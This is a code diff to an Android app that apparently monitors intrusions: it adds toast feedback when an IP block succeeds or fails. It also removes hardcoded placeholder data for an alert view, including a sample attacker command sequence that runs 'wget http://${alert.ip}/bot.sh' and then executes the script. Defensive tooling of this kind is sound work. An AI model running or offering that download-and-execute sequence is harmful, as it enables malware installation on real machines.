@@ -353,6 +353,8 @@ class MainActivity : ComponentActivity() {
                                         onBlockIp = { ip, ttl ->
                                             scope.launch {
                                                 repo.blockIp(ip, ttl)
+                                                    .onSuccess { Toast.makeText(this@MainActivity, "Blocked $ip", Toast.LENGTH_SHORT).show() }
+                                                    .onFailure { Toast.makeText(this@MainActivity, it.message ?: "Block failed", Toast.LENGTH_LONG).show() }
                                             }
                                         }
                                     )
@@ -373,6 +375,8 @@ class MainActivity : ComponentActivity() {
                                         onBlockIp = { ip ->
                                             scope.launch {
                                                 repo.blockIp(ip)
+                                                    .onSuccess { Toast.makeText(this@MainActivity, "Blocked $ip", Toast.LENGTH_SHORT).show() }
+                                                    .onFailure { Toast.makeText(this@MainActivity, it.message ?: "Block failed", Toast.LENGTH_LONG).show() }
                                             }
                                         },
                                         onInspectAlert = { alert ->
@@ -381,15 +385,8 @@ class MainActivity : ComponentActivity() {
                                                 ip = alert.ip,
                                                 country = alert.country,
                                                 risk_score = alert.riskScore,
-                                                mitre_techniques = if (alert.mitreId.isNotBlank()) listOf(alert.mitreId) else listOf("T1059.004", "T1082"),
-                                                commands = listOf(
-                                                    "uname -a",
-                                                    "cat /etc/issue",
-                                                    "whoami",
-                                                    "wget http://${alert.ip}/bot.sh",
-                                                    "chmod +x bot.sh",
-                                                    "./bot.sh"
-                                                ),
+                                                mitre_techniques = listOfNotNull(alert.mitreId.takeIf { it.isNotBlank() }),
+                                                commands = emptyList(),
                                                 blocked = alert.blocked,
                                                 timestamp_ms = alert.timestampMs
                                             )
@@ -443,6 +440,8 @@ class MainActivity : ComponentActivity() {
                                 onBlockIp = { ip, ttl ->
                                     scope.launch {
                                         repo.blockIp(ip, ttl)
+                                            .onSuccess { Toast.makeText(this@MainActivity, "Blocked $ip", Toast.LENGTH_SHORT).show() }
+                                            .onFailure { Toast.makeText(this@MainActivity, it.message ?: "Block failed", Toast.LENGTH_LONG).show() }
                                     }
                                 }
                             )
